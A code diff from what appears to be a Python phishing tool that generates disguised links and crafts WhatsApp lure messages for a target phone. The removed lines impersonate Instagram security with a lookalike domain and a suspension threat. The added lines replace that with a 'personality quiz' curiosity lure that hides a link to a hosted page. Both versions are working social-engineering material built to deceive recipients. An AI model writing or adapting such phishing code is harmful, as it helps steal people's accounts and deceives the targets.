@@ -206,23 +206,23 @@ ERROR_PAGE = """
 def generate_fake_link():
     """Generate a unique fake link that looks like Instagram's."""
     random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
-    # Simulate a real-looking Instagram link
-    real_looking_link = f"https://instagram-login-verification.com/{random_string}"
+    # Simulate a real-looking link
+    real_looking_link = f"https://mystery-quiz.com/{random_string}"
     # Simulate a shortened link (e.g., bit.ly style)
-    shortened_link = f"https://bit.ly/ig-{random_string[:6]}"
+    shortened_link = f"https://bit.ly/mq-{random_string[:6]}"
     # Actual link using Render URL
     actual_link = f"https://demo-3.onrender.com/{random_string}"  # Updated with your Render URL
     return real_looking_link, shortened_link, actual_link, random_string
 
 def craft_phishing_message(shortened_link, actual_link):
-    """Craft a convincing WhatsApp phishing message with a single clickable link."""
-    message = f"""Hello,
+    """Craft a curiosity-driven WhatsApp message with a single clickable link."""
+    message = f"""Hey there! 😊
 
-We detected a suspicious login attempt on your Instagram account. To avoid account suspension, please verify your identity using the link below within 24 hours:
+I just found this super cool personality quiz that reveals your hidden traits in a way you've never seen before! It’s kinda spooky how accurate it is… Want to find out what it says about you? Take the quiz now—it only takes a minute!
 
 {actual_link}
 
-Instagram Security Team"""
+Let me know what you get! 🧐"""
     return message
 
 def send_whatsapp_message(target_phone, message):
